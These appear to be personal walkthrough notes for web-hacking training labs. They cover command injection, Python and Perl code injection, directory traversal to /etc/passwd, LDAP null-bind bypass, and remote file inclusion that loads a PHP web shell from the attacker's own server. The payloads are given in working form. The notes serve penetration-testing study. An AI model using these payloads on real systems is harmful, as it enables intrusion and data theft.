-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
									Code execution PHP
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Command injection can be used to run arbitrary commands on a server.

Multiple payloads can be used to trigger this behavior. For example, let’s say that the initial command is:

ping [parameter]
Where [parameter] is the value you provided in the form or in the URL.

If you look at how the command line works, you will find that there are multiple ways to add more commands:

command1 && command2 that will run command2 if command1 succeeds.
command1 || command2 that will run command2 if command1 fails.
command1; command2 that will run command1 then command2.
command1 | command2 that will run command1 and send the output of command1 to command2.
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
									Code execution PHP web app [0]
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
In this case, the developer fixed the issue from the previous one and has started filtering some special characters.
However, the developer forgot that you can use `command` to run a command.
So when we inject something like ?ip=`id` we got this output: ping -c 2 `id` no errors and our command is printed back, it may seems like it's not executed but who knows maybe its a blind injection so to make sure if it executed or not, we can inject a reverse shell and check if we can get a reverse connection to our machine
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
									Code execution PHP web app [1]
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
In this challenge, the developer fixed the previous issue and is now filtering on even more special characters.
However, the developer forgot that you can use $(command) to run a command.
So our bypass will be like this :
?ip=127.0.0.1$(command) as in the previous challenge we have no output to check if the cmd has been executed or not so we may go blind, but there are some cool tricks to check if the cmd is executed or not
1/Use the sleep command and compare the time of responding $(sleep 10) so we should wait 10 seconds before getting the page.
2/ ping an external host that we own and check the logs
3/ curl  to read or download a file from our own server and check the logs
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
									Code execution Paython web app: [0]
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Even if the path is like this Target/hello/hacker
try to add " or ' at the end of its cause it maybe takes parameters, if you got an error,
try to craft a payload that bypasses this error then develop your exploit
some times you will have RCE but your payload won't work for example
os.system('id') this may be because the module os is not imported, so one thing we can do 
__import__('os').system('id') this may not work for many reasons so we need to play with the payload so it match our entry case we can use something like this "%2bstr(__import__('os').popen('id').read())%2b"
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
									Code execution Python web app: [1]
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
In other cases the first payload may not work because of some kind of restrinction maybe a waf, so we need to try encoding somthing like this "%2bstr(__import__('os').popen('"cat%20%252FEtc%252FPasswd').read())%2b"
Here we werent able to execute or normal "cat /etc/passwd" and by playing with the payload we understood that the "/" is the character that cause the error, so by urlencoding it we bypassed the error but with no result!
so lets try somthing else Base64 for example :
Command
base64encode(command) -> payload
exec (base64encode(payload))
import base65; b64decode(...)
__import__('base64').b64decode('Y2F0IC9ldGMvcGFzc3dkCg==')
" + str(__import__('os').popen(__import__('base64').b64decode('Y2F0IC9ldGMvcGFzc3dkCg==')).read()) +"
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
									Code injection in Perl: [0]
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
So in this application we have an endpoit like this :
http://Target/#hacker and by itercepting request using developer tool we can see that a page with this parametres load /cgi-bin/hello?name=hacker so if we go to it we will get json result :
{"str":"Hello hacker"}
so lets try to play with this page!
1] http://Target/cgi-bin/hello?name=hacker ---> {"str":"Hello hacker"}
2] http://Target/cgi-bin/hello?name=hacker" ---> {"str":"Hello hacker""}
3] http://Target/cgi-bin/hello?name=hacker' ---> {"str":""} interesting!
4] http://Target/cgi-bin/hello?name=hacker'' ---> {"str":""} interesting!
So we know that '' can be used to give us an empty string so what if we concatenate it with something like id
5] http://Target/cgi-bin/hello?name=hacker'.id.' ---> {"str":""} Notworking id is just printed!
What about using backtiks to make try making id command executable
6] http://Target/cgi-bin/hello?name=hacker'.`id`.' ---> {"str":"Hello hackeruid=33(www-data) gid=33(www-data) groups=33(www-data) [Voilla]
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
									Directory Traversals
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Directory traversals come from a lack of filtering/encoding of information used as part of a path by an application.

As with other vulnerabilities, you can use the "same value technique" to test for this type of issue.

For example, if the path used by the application inside a parameter is /images/photo.jpg. You can try to access:

/images/./photo.jpg: you should see the same file.
/images/../photo.jpg: you should get an error.
/images/../images/photo.jpg: you should see the same file again.
/images/../IMAGES/photo.jpg: you should get an error (depending on the file system), or something weird is going on.
If you don't have the value images and the legitimate path looks like photo.jpg, you will need to work out what the parent repository is.

Once you have tested that, you can try to retrieve other files.

On Linux/Unix the most common test case is the /etc/passwd.

You can test: `images/../../../../../../../../../../../etc/passwd`
If you get the passwd file, the application is vulnerable. The good news is that you don't need to know the number of ../. If you put too many, it will still work.

Another interesting thing to know is that if you have a directory traversal in Windows, you will be able to access test/../../../file.txt, even if the directory test does not exist.

This is not the case on Linux.

This can be really useful where the code concatenates user-controlled data, to create a file name.
For example, the following PHP code is supposed to add the parameter `id` to get a file name (`example_1.txt` for example). 
On Linux, you won't be able to exploit this vulnerability if there is no directory starting with example_, whereas, on Windows, you will be able to exploit it, even if there is no such directory.

$file = "/var/files/example_".$_GET['id'].".txt";
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
									Directory Traversals case [0]
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
In this case, we have a target: http://target/ with an image on the page, after looking at the source code we can see that the image link is like this :
Target/file.php?file=hacker.png so the image hacker.png has been called with the file parameter so as said before we can try to call another file /etc/passwd
and see if it's gonna work!
the final payload will be like this : ../../../../../../../../etc/passwd 
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
									Directory Traversals case [1]
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
In this case, we have the same target but this time the files are called using the full path: Target/file.php?file=/var/www/hacker.png
So basically our first payload won't work and it's normal because the path is different, but the bypass here is very simple, all we need to do is to keep
the original path and add out payload /var/www/../../../../../../../../etc/passwd 
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
									Directory Traversals case [2]
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
In this case, we still have the same target with the same vulnerable endpoint, but this time we have a filter that stops us from executing our payload
so this time Target/file.php?file=/var/www/hacker with no png extension which is mean that the extension is added by the server after loading the code in the page
So basically after using our payload ../../../../../../../../etc/passwd the server will add .png at the end of it and it will not be executed since its not correct
To bypass this kind of filter, we can use null byte [%00] so our new payload will be ../../../../../../../../etc/passwd%00 this will eliminate the extension added by the server 
and yeah we get the content of our passwd file!
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
									          File Include
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
In many applications, developers need to include files to load classes or to share some templates between multiple web pages.

"File Include" vulnerabilities come from a lack of filtering, in particular when a user-controlled parameter is used as part of a file name, in a call to an including function (require, require_once, include or include_once in PHP for example).

If the call to one of these methods is vulnerable, an attacker will be able to manipulate the function to load their own code.

"File Include" vulnerabilities can also be used as a directory traversal to read arbitrary files.

However, if the arbitrary code contains an opening PHP tag, the file will be interpreted as PHP code.

This function can allow the loading of local or remote resources (a website, for example). If vulnerable, it will lead to:

Local File Include LFI. A local file is read and interpreted.
Remote File Include: RFI. A remote file is retrieved and interpreted.
By default, PHP disables the loading of remote files, thanks to the configuration option: allow_url_include.
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
									          File Include [0]
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
In this first case our target is like this: http://target/?page=home.php our target is calling the home.php page with the parameter page, we can check if we have
a file inclusion vulnerability by calling something weird like " /  ' blabla or anything that doesn't exist on the server!
so we trigger an error :
Warning: include(blabla): failed to open stream: No such file or directory in /var/www/index.php on line 13
Warning: include(): Failed opening 'blabla' for inclusion (include_path='.:/usr/share/php:/usr/share/pear') in /var/www/index.php on line 13
The objective of this exercise is to find the File Include vulnerability on this page.
By having this error we know that the vulnerability exists we can also have an idea about the path of the application!
So the first thing we can do with this vuln, is to use it as a path traversal and read files like /etc/passwd or we can use it to have RCE
Since File inclusion work for internal files and also remote file the idea is that we gonna host a malicious file in our external Server then we call it
In my server i created poc.txt file with this code inside : <?php system($_GET['c']); ?>  so the location of the file now is IPofmyServer/poc.txt
By trying to call this file pour payload will be: Target/?page=http://IPofmyServer/poc.txt but unfortunately, we will get an error that says c variable is not defined!
You may think yes it's normal because we need to passe it like poc.txt?c=cmd, but in fact our malicious file is not a PHP file but its a TXT!
Basically, the payload will work fine if the poc was .PHP but the output will not be from out target but from our server, so how to do it with .TXT file?
It's so simple we will need to passe the c variable like this poc.txt&c=cmd so our final exploit will be like this: Target/?page=http://IPofmyServer/poc.txt&c=cmd
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
									          File Include [1]
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
In this case Our target is the same but the difference is that the end point is like this : http://Target/?page=page so we can see that the theres no extension or we can
say that its given by the server, so how to bypass it ?
Its simple we can use the same old payload but we need to use a random parameter to it to be like this Target/?page=http://IPofmyServer/poc.txt?random=&c=cmd
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
									          LDAP
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Companies store usernames, passwords, email addresses, printer connections, and other static data within directories. LDAP is an open, vendor-neutral application protocol for accessing and maintaining that data. LDAP can also tackle authentication, so users can sign on just once and access many different files on the server.

LDAP is a protocol, so it doesn't specify how directory programs work. Instead, it's a form of language that allows users to find the information they need very quickly.

LDAP is vender-neutral, so it can be used with a variety of different directory programs. Typically, a directory contains data that is:

Descriptive. Multiple points, such as name and location, come together to define an asset.
Static. The information doesn’t change much, and when it does, the shifts are subtle.
Valuable. Data stored within the directory is critical to core business functions, and it's touched over and over again.
Sometimes, people use LDAP in concert with other systems throughout the workday. For example, your employees may use LDAP to connect with printers or verify passwords. Those employees may then switch to Google for email, which doesn't rely on LDAP at all.
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
									          LDAP [0]
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
In normal situations, to connect to an LDAP server, you will need to provide a username and a passowd
However, some LDAP servers authorise NULL Bind:
If null values are sent, the LDAP server will proceed to bind the connection
As a result, the PHP code will think that the credentials are correct.
So in our case is simple, to bypass LDAP Authentication you will need to drope the parametes login and pass, you can use burpsuite to intersept the request and delete the parames and you will be connected!
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
									          LDAP [soon]
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
